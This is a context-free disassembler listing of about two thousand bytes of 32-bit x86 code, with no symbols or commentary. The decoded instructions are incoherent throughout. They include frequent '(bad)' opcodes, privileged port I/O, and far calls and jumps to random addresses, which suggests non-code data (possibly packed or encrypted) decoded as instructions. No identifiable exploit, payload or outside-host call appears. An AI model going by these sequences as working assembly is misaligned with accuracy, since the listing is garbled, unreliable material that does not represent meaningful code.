  411eb4:	mov    eax,ds:0xaf2119d9
  411eb9:	or     ebx,DWORD PTR ds:0x9ddd97d0
  411ebf:	jmp    0x804d6286
  411ec4:	shl    cl,1
  411ec6:	and    eax,0xdd799a2f
  411ecb:	cmp    eax,0xbe389e3
  411ed0:	push   0xfffffff4
  411ed2:	fwait
  411ed3:	das    
  411ed4:	push   es
  411ed5:	ins    BYTE PTR es:[edi],dx
  411ed6:	sahf   
  411ed7:	adc    DWORD PTR [esi+0x70322390],0xffffffa8
  411ede:	(bad)  
  411edf:	fcomip st,st(5)
  411ee1:	ficom  WORD PTR [ebp+0x58f976e0]
  411ee7:	repnz dec esi
  411ee9:	or     ebp,DWORD PTR [ecx+0x7]
  411eec:	add    al,0xb6
  411eee:	sahf   
  411eef:	daa    
  411ef0:	sbb    esi,ecx
  411ef2:	stos   BYTE PTR es:[edi],al
  411ef3:	pop    ebp
  411ef4:	jb     0x411e7f
  411ef6:	inc    edi
  411ef7:	xchg   ebp,eax
  411ef8:	test   esi,edi
  411efa:	mov    dl,0x2c
  411efc:	inc    ebp
  411efd:	mov    ah,0xf2
  411eff:	pop    ebp
  411f00:	sar    BYTE PTR [esi+0x5d96e44],0x6b
  411f07:	or     BYTE PTR [ebx+ebp*1],cl
  411f0a:	pop    edi
  411f0b:	cmp    ch,BYTE PTR [edx-0x6f]
  411f0e:	pop    ebx
  411f0f:	or     eax,0x4ee69b94
  411f14:	cmc    
  411f15:	outs   dx,BYTE PTR ds:[esi]
  411f16:	jns    0x411f6c
  411f18:	mov    edx,0x5f8960fb
  411f1d:	mov    edi,0xbc80cb18
  411f22:	cmp    BYTE PTR ds:0xd0b361dc,al
  411f28:	test   eax,0x99b3839d
  411f2d:	fisub  WORD PTR [edi+0x51]
  411f30:	fnstsw WORD PTR [ecx-0x2e0ef6a6]
  411f36:	xchg   ebp,eax
  411f37:	fild   WORD PTR [ebx-0x5ee9164c]
  411f3d:	mov    esp,DWORD PTR [ecx]
  411f3f:	enter  0xde4b,0xf8
  411f43:	in     al,dx
  411f44:	(bad)  
  411f45:	out    0x5f,al
  411f47:	call   0xedc7:0x6e998510
  411f4e:	adc    eax,0x259a5cbf
  411f53:	jmp    0x6e95ca5f
  411f58:	dec    esp
  411f59:	shl    BYTE PTR [edi+0x2],0xc8
  411f5d:	inc    esp
  411f5e:	bnd jb 0x411f91
  411f61:	stc    
  411f62:	adc    esp,DWORD PTR [eax+eiz*2]
  411f65:	repnz leave 
  411f67:	jg     0x411fb0
  411f69:	in     eax,dx
  411f6a:	pop    edx
  411f6b:	pop    ds
  411f6c:	inc    ebx
  411f6d:	push   esi
  411f6e:	add    ah,bl
  411f70:	or     BYTE PTR [ebp+0x6df22709],al
  411f76:	push   ds
  411f77:	xchg   DWORD PTR [esi-0x4c],ebp
  411f7a:	or     BYTE PTR [ecx+edi*2],dl
  411f7d:	test   al,0x96
  411f7f:	mov    ah,0x7d
  411f81:	rol    BYTE PTR [esi],cl
  411f83:	loope  0x411fa4
  411f85:	lahf   
  411f86:	fisubr DWORD PTR [edi+edi*2-0x6756d403]
  411f8d:	sub    eax,0xa0c23a25
  411f92:	pop    ebx
  411f93:	lahf   
  411f94:	scas   eax,DWORD PTR es:[edi]
  411f95:	push   esi
  411f96:	je     0x411f7d
  411f98:	lock shl ecx,0xea
  411f9c:	push   ecx
  411f9d:	mov    ah,0xec
  411f9f:	cwde   
  411fa0:	ret    
  411fa1:	pop    ss
  411fa2:	je     0x411fd0
  411fa4:	addr16 mov ds:0x93f6,eax
  411fa8:	dec    ebp
  411fa9:	vpaddd ymm2{k3}{z},ymm2,DWORD PTR [ebp+0x383c9214]{1to8}
  411fb3:	cwde   
  411fb4:	aaa    
  411fb5:	pop    esp
  411fb6:	xlat   BYTE PTR ds:[ebx]
  411fb7:	add    ch,BYTE PTR [esi-0x51]
  411fba:	rol    DWORD PTR [edx-0x62018eaf],0xb0
  411fc1:	(bad)  
  411fc2:	in     al,dx
  411fc3:	mov    dl,BYTE PTR [ebx+ebp*8-0x6b3daa2f]
  411fca:	sahf   
  411fcb:	sub    al,0x7f
  411fcd:	das    
  411fce:	cmp    dh,bh
  411fd0:	adc    eax,0x5d52342e
  411fd5:	imul   ebx,edi,0xffffffd9
  411fd8:	mov    ah,0x8f
  411fda:	jg     0x411fbb
  411fdc:	les    ebp,FWORD PTR [ebx+0x6e4ae20b]
  411fe2:	fbld   TBYTE PTR [edi-0x1044d235]
  411fe8:	cmp    al,0xed
  411fea:	lods   al,BYTE PTR ds:[esi]
  411feb:	(bad)  
  411fec:	sub    DWORD PTR [ebp-0x2886e952],0xc8b2ce1e
  411ff6:	mov    bl,0xa7
  411ff8:	jecxz  0x412054
  411ffa:	adc    esi,DWORD PTR [edx]
  411ffc:	inc    esi
  411ffd:	cmp    al,0x62
  411fff:	or     al,0x88
  412001:	call   0x9f64:0xf2ae668d
  412008:	pushf  
  412009:	ror    bl,1
  41200b:	(bad)  
  41200d:	sti    
  41200e:	das    
  41200f:	push   eax
  412010:	xchg   edx,eax
  412011:	mov    ebx,0x6115e935
  412016:	xor    eax,0x95821f24
  41201b:	push   cs
  41201c:	cmp    al,0x30
  41201e:	xchg   ebp,eax
  41201f:	and    DWORD PTR [edi-0x3e],eax
  412022:	into   
  412023:	frstor [edx]
  412025:	(bad)  
  412027:	lods   al,BYTE PTR ds:[esi]
  412028:	sbb    al,0xf2
  41202a:	(bad)  
  41202b:	sbb    al,0x8f
  41202d:	and    esp,DWORD PTR [esi-0x1d]
  412030:	push   ebx
  412031:	xchg   esi,eax
  412032:	mov    esp,0x2e8833b4
  412037:	mov    WORD PTR [edx],cs
  412039:	inc    esi
  41203a:	and    cl,BYTE PTR ds:0x31862043
  412040:	dec    esp
  412041:	inc    eax
  412042:	adc    DWORD PTR ds:[eax+0x1e],0xffd2233f
  41204a:	pop    eax
  41204b:	popa   
  41204c:	jae    0x411fee
  41204e:	jo     0x412068
  412050:	xchg   edx,eax
  412051:	outs   dx,BYTE PTR ds:[esi]
  412052:	add    esp,ecx
  412054:	ror    BYTE PTR [edx-0x50],1
  412057:	mov    WORD PTR [eax-0x6d],?
  41205a:	pop    ds
  41205b:	dec    ebp
  41205c:	or     BYTE PTR [edx+0xd6f32e4],0x75
  412063:	int    0xdd
  412065:	cmp    edx,esp
  412067:	or     al,ah
  412069:	pop    ecx
  41206a:	stc    
  41206b:	nop
  41206c:	or     ebx,DWORD PTR [edx+0x14]
  41206f:	out    dx,eax
  412070:	mov    ?,WORD PTR [ebx-0x7b]
  412073:	push   esp
  412074:	stos   DWORD PTR es:[edi],eax
  412075:	sub    eax,ebx
  412077:	cdq    
  412078:	push   eax
  412079:	and    eax,0xb5936190
  41207e:	push   edx
  41207f:	pop    ebp
  412080:	pop    ecx
  412081:	jmp    0x4120fa
  412083:	pop    eax
  412084:	xchg   ebp,eax
  412085:	ret    
  412086:	xor    DWORD PTR [ebx+0x58974ead],eax
  41208c:	sub    esi,DWORD PTR [eax+ebx*1]
  41208f:	jecxz  0x412064
  412091:	shl    BYTE PTR [edx],0x3d
  412094:	pop    esp
  412095:	add    esp,ebx
  412097:	mov    ch,0x35
  412099:	dec    esp
  41209a:	mov    BYTE PTR [edx+0x58],ch
  41209d:	mov    ch,0xd4
  41209f:	nop    DWORD PTR [edi-0x28a57e8]
  4120a6:	mov    esi,DWORD PTR [ebx]
  4120a8:	add    bl,BYTE PTR [edx+0x581493ce]
  4120ae:	test   BYTE PTR [ebp-0x663a2e29],dh
  4120b4:	add    BYTE PTR [ebp-0x2799df3f],ch
  4120ba:	sbb    DWORD PTR gs:[edi+0xf3caf9e],0xffffffac
  4120c2:	inc    esi
  4120c3:	add    BYTE PTR [ebp-0x1fe100e9],0xb9
  4120ca:	(bad)  
  4120cb:	lods   al,BYTE PTR ds:[esi]
  4120cc:	add    al,0x85
  4120ce:	xchg   DWORD PTR [ebp+0x10],esi
  4120d1:	mov    dl,BYTE PTR [esi]
  4120d3:	test   al,0x55
  4120d5:	dec    esi
  4120d6:	push   eax
  4120d7:	inc    ebp
  4120d8:	jne    0x41207a
  4120da:	sahf   
  4120db:	nop
  4120dc:	std    
  4120dd:	sbb    DWORD PTR [eax+edi*8-0x1b],0xfffffff6
  4120e2:	ficomp DWORD PTR [eax+0x6343d62e]
  4120e8:	aam    0x25
  4120ea:	and    DWORD PTR [ebx],edi
  4120ec:	das    
  4120ed:	inc    edx
  4120ee:	fcmovnu st,st(1)
  4120f0:	push   0xfffffffa
  4120f2:	bnd jae 0x412170
  4120f5:	mov    bh,0x25
  4120f7:	sbb    DWORD PTR [esi-0x6ca439c5],eax
  4120fd:	retf   0x44a0
  412100:	fsub   st,st(0)
  412102:	or     bh,BYTE PTR [ecx+0x50]
  412105:	pop    esp
  412106:	push   eax
  412107:	int    0x33
  412109:	or     dl,BYTE PTR [edx-0x3d]
  41210c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41210d:	mov    DWORD PTR [esi],edi
  41210f:	call   0xdeb4c880
  412114:	mov    eax,ds:0xfc6cd7c2
  412119:	out    0x63,al
  41211b:	out    dx,al
  41211c:	ror    BYTE PTR [ebp+0x14],cl
  41211f:	clc    
  412120:	and    DWORD PTR [edi-0x60],ebx
  412123:	xor    ebp,esi
  412125:	sbb    BYTE PTR [esi-0x71],0x2d
  412129:	iret   
  41212a:	into   
  41212b:	in     eax,0x71
  41212d:	call   0x83fdaa05
  412132:	sti    
  412133:	xlat   BYTE PTR ds:[ebx]
  412134:	cs dec edi
  412136:	std    
  412137:	xchg   esi,eax
  412138:	xchg   edi,eax
  412139:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41213b:	leave  
  41213c:	adc    al,0x36
  41213e:	mov    edi,0x8defba7f
  412143:	call   0x79a86d19
  412148:	or     al,0x84
  41214a:	jge    0x4121a7
  41214c:	lea    eax,[esi+0x721c5dbd]
  412152:	push   0x9c9c85da
  412157:	retf   0x926d
  41215a:	jl     0x41213e
  41215c:	lea    ecx,[esi]
  41215e:	pop    ebx
  41215f:	jmp    0x74f3:0xd97368ee
  412166:	mov    ah,0xf5
  412168:	push   ecx
  412169:	push   edx
  41216a:	(bad)
  41216d:	(bad)  
  41216e:	enter  0x7084,0xa8
  412172:	xor    bl,0x36
  412175:	enter  0x555c,0x4
  412179:	lea    edi,[edx+ebp*8+0x3c9b9352]
  412180:	sub    eax,0xec1b483d
  412185:	or     DWORD PTR [ebx],esp
  412187:	cld    
  412188:	ret    0xa3d4
  41218b:	inc    edx
  41218c:	es mov ah,0x53
  41218f:	or     DWORD PTR [eax],ebx
  412191:	fwait
  412192:	rcr    BYTE PTR [ecx+edx*1+0x25],cl
  412196:	jb     0x41217d
  412198:	adc    eax,0xdbb96df3
  41219d:	mov    al,ds:0xa33c1b32
  4121a2:	jbe    0x412170
  4121a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121a5:	cli    
  4121a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121a7:	leave  
  4121a8:	ins    DWORD PTR es:[edi],dx
  4121a9:	jne    0x4121cc
  4121ab:	pop    esp
  4121ac:	or     eax,0xcad69b50
  4121b1:	mov    edx,0x9fa43b9d
  4121b6:	cdq    
  4121b7:	jno    0x41216c
  4121b9:	cli    
  4121ba:	sbb    eax,0x3ed3be18
  4121bf:	(bad)  
  4121c0:	aas    
  4121c1:	mov    eax,0x480eda6
  4121c6:	pop    esi
  4121c7:	pop    esi
  4121c8:	pop    ebp
  4121c9:	add    eax,0xd8658e26
  4121ce:	add    cl,BYTE PTR [ebx+eax*1+0x65]
  4121d2:	push   esi
  4121d3:	jmp    0x4121fa
  4121d5:	(bad)  
  4121d6:	int3   
  4121d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d8:	fsub   DWORD PTR [ebx-0x4bef11f8]
  4121de:	jle    0x412187
  4121e0:	pop    ebp
  4121e1:	popa   
  4121e2:	push   esi
  4121e3:	adc    DWORD PTR ds:0x2a86c237,edi
  4121e9:	js     0x4121a7
  4121eb:	ja     0x412251
  4121ed:	daa    
  4121ee:	mov    BYTE PTR [ebp-0x4109200d],bl
  4121f4:	mov    gs,WORD PTR [ecx-0x5594dc18]
  4121fa:	in     al,dx
  4121fb:	and    DWORD PTR [edi+eiz*8+0x5825cd2c],ebp
  412202:	pop    edx
  412203:	sub    DWORD PTR [edi-0x4b],eax
  412206:	xor    al,0x73
  412208:	or     eax,0xf13fe15b
  41220d:	xchg   esi,eax
  41220e:	lds    ebp,FWORD PTR [edi-0x31434670]
  412214:	fmul   QWORD PTR [ecx-0x890c8a4]
  41221a:	and    BYTE PTR ds:0xc66b8ed6,dl
  412220:	hlt    
  412221:	mov    esi,0x5e08edc3
  412226:	nop
  412227:	das    
  412228:	popa   
  412229:	stc    
  41222a:	pop    esp
  41222b:	xchg   ebp,eax
  41222c:	pop    ecx
  41222d:	push   edi
  41222e:	sar    BYTE PTR [edx-0x65],cl
  412231:	jae    0x4121e5
  412233:	out    dx,eax
  412234:	inc    BYTE PTR [ebx+ebp*4]
  412237:	mov    ecx,0xa3e2bbd9
  41223c:	and    cx,bp
  41223f:	ret    
  412240:	push   esi
  412241:	jae    0x412270
  412243:	ret    
  412244:	les    esi,FWORD PTR [eax+ebx*1+0x6ccdda2b]
  41224b:	jne    0x412263
  41224d:	sub    edi,0xc408fdb6
  412253:	fwait
  412254:	out    dx,al
  412255:	lods   al,BYTE PTR ds:[esi]
  412256:	(bad)  [edx-0x21]
  412259:	jle    0x41222a
  41225b:	lahf   
  41225c:	or     DWORD PTR fs:[eax-0x1c],0xf0780e64
  412264:	and    al,0xc9
  412266:	sub    BYTE PTR [eax+0x2f4820af],al
  41226c:	mov    bh,BYTE PTR [esi-0x56]
  41226f:	push   cs
  412270:	inc    eax
  412271:	and    DWORD PTR ds:0xa7f19f9c,0x95099fb2
  41227b:	daa    
  41227c:	shl    DWORD PTR [eax-0x3ff64434],0xd4
  412283:	sub    BYTE PTR [esi+0x237337f1],dh
  412289:	and    bl,BYTE PTR [edi]
  41228b:	fs inc ebx
  41228d:	ss jecxz 0x412283
  412290:	in     al,0xf6
  412292:	rol    DWORD PTR [esi],cl
  412294:	xchg   esp,eax
  412295:	loopne 0x412245
  412297:	push   ds
  412298:	push   edi
  412299:	mov    BYTE PTR [edx],al
  41229b:	std    
  41229c:	test   eax,0x4b9e8c86
  4122a1:	adc    al,0xeb
  4122a3:	push   0xfffffffa
  4122a5:	inc    ebx
  4122a6:	mov    eax,ds:0xbc0eaca5
  4122ab:	ds sbb al,0x8
  4122ae:	aam    0x84
  4122b0:	sub    BYTE PTR [esi],0x2e
  4122b3:	lahf   
  4122b4:	iret   
  4122b5:	jmp    0x41224d
  4122b7:	push   esi
  4122b8:	inc    ecx
  4122b9:	call   0x8bfa40ae
  4122be:	call   0xc95a80f3
  4122c3:	xor    BYTE PTR [eax+0x68],bh
  4122c6:	push   ebp
  4122c7:	jbe    0x412292
  4122c9:	fucomi st,st(6)
  4122cb:	inc    ebx
  4122cc:	iret   
  4122cd:	mov    ah,0x5e
  4122cf:	ins    BYTE PTR es:[edi],dx
  4122d0:	push   esp
  4122d1:	add    esp,DWORD PTR [edx]
  4122d3:	mov    bh,0xdd
  4122d5:	fistp  WORD PTR [esi-0x2a00287]
  4122db:	popa   
  4122dc:	and    eax,0x61687839
  4122e1:	int3   
  4122e2:	mov    ch,0x9
  4122e4:	and    DWORD PTR [edi],esp
  4122e6:	pop    ebx
  4122e7:	inc    ebx
  4122e8:	mov    gs,WORD PTR [esi]
  4122ea:	ins    DWORD PTR es:[edi],dx
  4122eb:	(bad)  [eax+0x5ae9fbc2]
  4122f1:	push   0x898e0f
  4122f6:	pushf  
  4122f7:	out    dx,al
  4122f8:	shl    bl,cl
  4122fa:	ret    
  4122fb:	sub    eax,0xbd3f0763
  412300:	sahf   
  412301:	loop   0x41237c
  412303:	cmp    bh,cl
  412305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412306:	rol    BYTE PTR [esi+0x2],cl
  412309:	or     BYTE PTR [ebx+0x5783d0b7],al
  41230f:	pop    edi
  412310:	xor    ecx,DWORD PTR [esi-0x6d8edda]
  412316:	inc    eax
  412317:	xlat   BYTE PTR ds:[ebx]
  412318:	adc    ecx,0x76
  41231b:	lods   al,BYTE PTR ds:[esi]
  41231c:	stos   BYTE PTR es:[edi],al
  41231d:	push   esp
  41231e:	xchg   edi,eax
  41231f:	adc    dh,0x90
  412322:	xchg   DWORD PTR [eax-0x2bb6d652],edx
  412328:	sub    eax,0x157746f3
  41232d:	mov    al,ah
  41232f:	push   edx
  412330:	lds    ecx,FWORD PTR [ebp+edi*1+0x49]
  412334:	jle    0x4122c7
  412336:	lea    esp,[edx]
  412338:	into   
  412339:	xor    edi,esi
  41233b:	mov    dh,0xda
  41233d:	jmp    0x412357
  41233f:	loope  0x41230c
  412341:	test   DWORD PTR [edx],0xf5eb6ab7
  412347:	(bad)  
  412348:	repnz das 
  41234a:	nop
  41234b:	mov    al,0xb0
  41234d:	xor    ah,BYTE PTR [ebx+0x0]
  412350:	xchg   edi,ecx
  412352:	or     dh,BYTE PTR [esi-0x17b21016]
  412358:	push   ebp
  412359:	xchg   ebx,eax
  41235a:	jae    0x412318
  41235c:	sar    esp,0xf8
  41235f:	js     0x412355
  412361:	sbb    BYTE PTR [ecx-0x2],bh
  412364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412365:	sub    BYTE PTR [ebx-0x71894639],ah
  41236b:	pop    ss
  41236c:	mul    DWORD PTR [ebp+0xd]
  41236f:	ss mov ebx,ss
  412372:	cmp    bh,BYTE PTR [esi]
  412374:	xor    BYTE PTR [esi-0x6e],cl
  412377:	adc    eax,0x1d14943b
  41237c:	inc    esp
  41237d:	push   ebp
  41237e:	and    edx,eax
  412380:	adc    BYTE PTR [esi],0xd3
  412383:	mov    dl,BYTE PTR [ebx-0x51e3ae8f]
  412389:	jne    0x412394
  41238b:	cld    
  41238c:	ret    
  41238d:	std    
  41238e:	ins    BYTE PTR es:[edi],dx
  41238f:	out    0xee,eax
  412391:	or     ebx,DWORD PTR [ecx]
  412393:	aaa    
  412394:	lods   eax,DWORD PTR ds:[esi]
  412395:	ret    0x9380
  412398:	pop    es
  412399:	cmp    DWORD PTR [edx+0x19cdf483],edx
  41239f:	fmul   QWORD PTR [ecx]
  4123a1:	imul   eax,DWORD PTR ds:0xe8f64acc,0x5f8ed431
  4123ab:	or     al,0x5c
  4123ad:	cld    
  4123ae:	dec    esp
  4123af:	dec    ecx
  4123b0:	scas   eax,DWORD PTR es:[edi]
  4123b1:	fs mov edx,0x2dd27ac3
  4123b7:	mov    esi,eax
  4123b9:	add    ebx,DWORD PTR [edi+edx*8+0x5d]
  4123bd:	inc    edx
  4123be:	cli    
  4123bf:	arpl   WORD PTR [ecx+0x71],ax
  4123c2:	add    eax,ebx
  4123c4:	mov    ebp,0xdd89c98b
  4123c9:	fwait
  4123ca:	sbb    ax,WORD PTR [ecx-0x5b]
  4123ce:	ins    BYTE PTR es:[edi],dx
  4123cf:	adc    DWORD PTR [ebp-0x61],0xffffff92
  4123d3:	add    DWORD PTR [ebx+0x24],eax
  4123d6:	(bad)  
  4123d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123d8:	test   eax,0x4a6d3af3
  4123dd:	mul    BYTE PTR [ecx+eax*8+0x3f]
  4123e1:	xlat   BYTE PTR ds:[ebx]
  4123e2:	(bad)  
  4123e3:	mov    edi,0xf6483857
  4123e8:	retf   
  4123e9:	xor    bh,dl
  4123eb:	hlt    
  4123ec:	or     BYTE PTR [ecx+0x1cde8e2b],dh
  4123f2:	mov    ebp,0xb9906545
  4123f7:	fldenv [edx+0x422a10a2]
  4123fd:	aam    0x82
  4123ff:	or     ah,BYTE PTR [eax+0x71]
  412402:	xchg   ecx,eax
  412403:	sahf   
  412404:	mov    esi,0x6c702a02
  412409:	js     0x412430
  41240b:	pop    es
  41240c:	call   0xb667:0x20cfa58f
  412413:	pop    ebp
  412414:	daa    
  412415:	mov    ebp,0x8d991d89
  41241a:	and    esp,ecx
  41241c:	cmpxchg BYTE PTR [ebp+0xd],dh
  412420:	jl     0x4123ef
  412422:	mov    cl,0x5d
  412424:	shl    DWORD PTR [eax+0x59290fec],cl
  41242a:	dec    edx
  41242b:	pop    eax
  41242c:	cli    
  41242d:	(bad)
  412430:	std    
  412431:	retf   
  412432:	and    eax,0xafee8746
  412437:	mov    ds:0x6764ca7,eax
  41243c:	(bad)  
  41243d:	repnz ss mov esp,0x89ef305c
  412444:	loope  0x412423
  412446:	cmp    edx,DWORD PTR [ebx+ecx*8]
  412449:	cdq    
  41244a:	fsub   QWORD PTR [edx+edx*2]
  41244d:	fadd   QWORD PTR [ecx-0x45]
  412450:	push   eax
  412451:	(bad)  
  412452:	mov    ds:0x6c92bdaa,eax
  412457:	xchg   ebx,eax
  412458:	rcl    DWORD PTR [ebx],cl
  41245a:	iret   
  41245b:	ret    
  41245c:	mov    ds:0x9650d108,al
  412461:	dec    ebp
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	aas    
  412464:	add    DWORD PTR ds:0x901b289d,ecx
  41246b:	fidivr DWORD PTR [esi-0x2b]
  41246e:	out    0x6b,al
  412470:	add    ecx,0xdbd0a840
  412476:	mov    al,ss:0x64433573
  41247c:	pushf  
  41247d:	sbb    al,0x64
  41247f:	call   0xe33f9417
  412484:	xlat   BYTE PTR ds:[ebx]
  412485:	mov    dh,0x6e
  412487:	mov    ds:0xfb93a40d,al
  41248c:	imul   eax,DWORD PTR ds:[ebx+0x1d5f8f57],0x5
  412494:	cs out 0xe4,al
  412497:	loop   0x41241d
  412499:	mov    cl,0xa0
  41249b:	jl     0x41248c
  41249d:	outs   dx,BYTE PTR ds:[esi]
  41249e:	enter  0x6585,0x40
  4124a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124a3:	icebp  
  4124a4:	jns    0x412460
  4124a6:	je     0x4124ca
  4124a8:	adc    BYTE PTR [ebp+0xd],dh
  4124ab:	pop    es
  4124ac:	aas    
  4124ad:	pop    ebx
  4124ae:	dec    esi
  4124af:	out    dx,eax
  4124b0:	pop    edx
  4124b1:	cwde   
  4124b2:	sub    ch,BYTE PTR [eax+0x2b936bc3]
  4124b8:	fwait
  4124b9:	js     0x412444
  4124bb:	and    DWORD PTR [esi],ecx
  4124bd:	lea    eax,[eax+0x4b702215]
  4124c3:	xor    ch,bh
  4124c5:	mov    ecx,0x9fbe8921
  4124ca:	lds    eax,FWORD PTR [esp+ebx*1]
  4124cd:	loope  0x412505
  4124cf:	mov    eax,ds:0xecf41115
  4124d4:	xlat   BYTE PTR ds:[ebx]
  4124d5:	push   cs
  4124d6:	push   0xffffff91
  4124d8:	shl    BYTE PTR [esi+eiz*4],0x33
  4124dc:	out    0x38,eax
  4124de:	mov    ds:0x20bfce9,al
  4124e3:	cmp    esp,DWORD PTR ds:0x154eead0
  4124e9:	inc    ecx
  4124ea:	js     0x41253a
  4124ec:	fdivr  st,st(5)
  4124ee:	rol    DWORD PTR [edi],cl
  4124f0:	es cli 
  4124f2:	lods   al,BYTE PTR ds:[esi]
  4124f3:	inc    ebx
  4124f4:	add    esi,DWORD PTR [eax-0x67b176d1]
  4124fa:	dec    ebx
  4124fb:	fldenv [ebx-0x7b9e09cb]
  412501:	js     0x41248b
  412503:	xchg   esi,eax
  412504:	pop    edi
  412505:	test   DWORD PTR [ecx],ebx
  412507:	dec    edi
  412508:	adc    cl,0xc0
  41250b:	rol    BYTE PTR [eax-0x63],0xbb
  41250f:	in     eax,dx
  412510:	sbb    DWORD PTR [eax],esi
  412512:	and    al,0x7d
  412514:	mov    ebx,0xd9a753b5
  412519:	arpl   sp,sp
  41251b:	push   0xc5fc65dc
  412520:	aam    0xc5
  412522:	cli    
  412523:	or     cl,dh
  412525:	pusha  
  412526:	dec    ecx
  412527:	pop    ds
  412528:	out    0x11,eax
  41252a:	cmp    eax,0x7f276166
  41252f:	xor    DWORD PTR [esi-0x63],0x42
  412533:	cmp    eax,0x426b98ed
  412538:	loopne 0x412531
  41253a:	push   cs
  41253b:	mov    eax,0xd0dfb64d
  412540:	pop    ss
  412541:	or     esi,DWORD PTR [ecx]
  412543:	ret    
  412544:	dec    ebx
  412545:	pop    eax
  412546:	inc    eax
  412547:	push   ss
  412548:	fcmove st,st(0)
  41254a:	add    DWORD PTR [edx-0x7f90e8bf],esi
  412550:	dec    eax
  412551:	push   0xffffffc9
  412553:	hlt    
  412554:	mov    ebp,esi
  412556:	sbb    al,0xc4
  412558:	xchg   ebx,ebx
  41255a:	call   0x608b7cf3
  41255f:	cdq    
  412560:	scas   al,BYTE PTR es:[edi]
  412561:	and    esp,DWORD PTR [edx+ebp*4+0x7d]
  412565:	pop    edi
  412566:	sub    esp,DWORD PTR [ebp+0x16]
  412569:	add    al,0xdb
  41256b:	dec    edx
  41256c:	push   eax
  41256d:	xor    eax,0xd7ddd67b
  412572:	jnp    0x4125a6
  412574:	jle    0x4125e8
  412576:	es aaa 
  412578:	pop    ebp
  412579:	pop    esi
  41257a:	sub    eax,0x8ed8b36e
  41257f:	xor    ch,BYTE PTR [ecx-0x52032f31]
  412585:	bound  edx,QWORD PTR [edi-0x4352cbcd]
  41258b:	push   ebx
  41258c:	ror    esi,0xfb
  41258f:	sbb    esp,DWORD PTR [edx+0x66]
  412592:	mov    ebp,0x347d91ec
  412597:	jp     0x41251e
  412599:	nop
  41259a:	retf   
  41259b:	out    0xa9,eax
  41259d:	fmul   QWORD PTR es:[ecx]
  4125a0:	daa    
  4125a1:	jg     0x412523
  4125a3:	jmp    0xc2e5:0x93c9da66
  4125aa:	pop    es
  4125ab:	aad    0x71
  4125ad:	call   0x67f0:0x37fa30c8
  4125b4:	aas    
  4125b5:	xchg   ebp,eax
  4125b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125b7:	nop
  4125b8:	cwde   
  4125b9:	jae    0x412561
  4125bb:	or     ecx,DWORD PTR [edx-0x5b]
  4125be:	sub    al,0x72
  4125c0:	sub    DWORD PTR [eax],ecx
  4125c2:	and    ebx,DWORD PTR [ecx-0x6c]
  4125c5:	jns    0x4125b3
  4125c7:	mov    WORD PTR [ebx+0x1d],ss
  4125ca:	sub    ch,al
  4125cc:	sub    DWORD PTR [edx+0x2582a581],edx
  4125d2:	mov    edi,0xc60352c3
  4125d7:	ror    bl,0x30
  4125da:	pop    ebx
  4125db:	leave  
  4125dc:	outs   dx,BYTE PTR ds:[esi]
  4125dd:	imul   ah
  4125df:	fisub  DWORD PTR [ecx]
  4125e1:	loopne 0x41257b
  4125e3:	das    
  4125e4:	pop    ds
  4125e5:	xchg   edi,eax
  4125e6:	test   esi,esp
  4125e8:	inc    ebp
  4125e9:	cwde   
  4125ea:	jg     0x41262c
  4125ec:	xchg   edx,eax
  4125ed:	xchg   ebp,eax
  4125ee:	fidiv  WORD PTR [eax]
  4125f0:	pop    edi
  4125f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f2:	xlat   BYTE PTR ds:[ebx]
  4125f3:	sbb    cl,dh
  4125f5:	outs   dx,DWORD PTR ds:[esi]
  4125f6:	ss cli 
  4125f8:	ds add eax,0x20825964
  4125fe:	sbb    DWORD PTR [ecx-0x46567f6b],edx
  412604:	nop
  412605:	aad    0xb4
  412607:	(bad)  
  412608:	mov    ebx,ds
  41260a:	ja     0x41264f
  41260c:	test   al,0x25
  41260e:	std    
  41260f:	shl    DWORD PTR [esi],cl
  412611:	push   ss
  412612:	add    BYTE PTR [ebx],dl
  412614:	sub    ebp,edx
  412616:	(bad)  
  412618:	popa   
  412619:	pop    esi
  41261a:	(bad)  
  41261b:	sbb    BYTE PTR [edi+0x4cc52a17],0x1
  412622:	jmp    0x4125d5
  412624:	out    dx,al
  412625:	cmp    DWORD PTR [esi-0x759a01f3],esi
  41262b:	scas   al,BYTE PTR es:[edi]
  41262c:	and    DWORD PTR [esi+ecx*2-0x2ba9ab79],0x7e
  412634:	lock add eax,0xbbcff748
  41263a:	push   edx
  41263b:	and    dl,dl
  41263d:	mov    WORD PTR [esi+ebx*4+0x9],fs
  412641:	imul   esi,DWORD PTR ds:[esp+ebp*4],0x1f
  412646:	jecxz  0x412667
  412648:	inc    eax
  412649:	out    dx,eax
  41264a:	lahf   
  41264b:	mov    eax,0xc96bba47
  412650:	mov    eax,ds:0xe6c1b24c
  412655:	pop    ebx
  412656:	sbb    eax,DWORD PTR [edi+0x59]
  412659:	and    ch,dl
  41265b:	ja     0x4125fc
  41265d:	jmp    0x5a1e:0x108726e8
  412664:	sar    BYTE PTR [eax+0x54],1
  412667:	mov    BYTE PTR [esi+0x7925b086],bl
  41266d:	push   edi
  41266e:	icebp  
  41266f:	jnp    0x41260a
  412671:	or     BYTE PTR [eax-0x37],bh
  412674:	mov    ebp,0xe39c64fe
  412679:	sub    ah,bh
  41267b:	repnz pop edi
  41267d:	push   ebx
  41267e:	pop    ds
  41267f:	in     al,dx
  412680:	fistp  QWORD PTR [ecx-0x69]
  412683:	mov    ah,0x1d
  412685:	add    eax,0xa7ddd912
  41268a:	mov    dl,0x40
  41268c:	cmp    DWORD PTR [esi],ebp
  41268e:	outs   dx,DWORD PTR ds:[esi]
  41268f:	cmp    DWORD PTR ds:0x23f8a27f,edx
  412695:	or     dl,ch
  412697:	mov    esi,0xdd9040d9
  41269c:	int3   
  41269d:	sub    eax,edx
  41269f:	imul   edi,DWORD PTR [esi+ecx*1],0x4ade5108
  4126a6:	cmp    edx,DWORD PTR [ebx]
  4126a8:	leave  
  4126a9:	push   esi
